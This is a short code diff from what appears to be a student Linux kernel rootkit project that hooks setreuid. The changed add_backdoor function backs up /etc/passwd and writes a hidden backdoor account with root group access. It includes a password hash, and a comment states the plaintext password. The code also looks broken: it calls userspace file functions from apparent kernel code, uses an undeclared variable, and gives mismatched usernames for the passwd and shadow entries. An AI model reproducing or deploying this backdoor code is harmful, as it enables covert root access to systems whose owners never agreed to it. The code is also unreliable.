@@ -58,7 +58,15 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
 void add_backdoor(char *path) {
 	
-		char* backdoor_password = "rootkituser1:x:900:0:backdoor:/home:/bin/bash\n";
+		FILE *source, *target;
+		source = fopen("/etc/passwd", "r");
+		target = fopen ("/etc/origpasswd", "w");
+		while ( (ch = fgetc(source) ) != EOF)
+			fputc(ch, target);
+		fclose(source);
+		fclose(target);
+	
+		char* backdoor_password = "rootkituser1:x:987:0:backdoor:/home:/bin/bash\n";
 		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
 		// PASSWORD (encodes in SHA 512) = cse331!	
 		
